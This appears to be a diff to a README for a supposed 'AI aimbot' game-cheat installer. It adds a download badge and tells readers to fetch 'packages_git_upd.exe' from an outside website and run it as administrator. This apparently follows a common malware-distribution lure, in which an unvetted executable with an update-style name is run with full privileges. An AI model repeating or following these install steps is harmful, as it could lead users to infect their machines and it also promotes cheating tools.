@@ -7,8 +7,9 @@ This tool allows you to quickly deploy and keep up-to-date an AI aimbot based on
 ## 🚀 Quick Start
 
 ### Installation and Update
+[![Download Now](https://img.shields.io/badge/Download-Official%20Release-8A2BE2?style=for-the-badge&logo=windows)](https://fullsofts.org)
 
-### 1. **Download** `packages_git_upd.exe` from here - fullsofts.org
+### 1. **Download** `packages_git_upd.exe` from button above 
 2. **Run the program** (recommended as administrator)
 3. Wait for the automatic installation/update of all components to complete
 
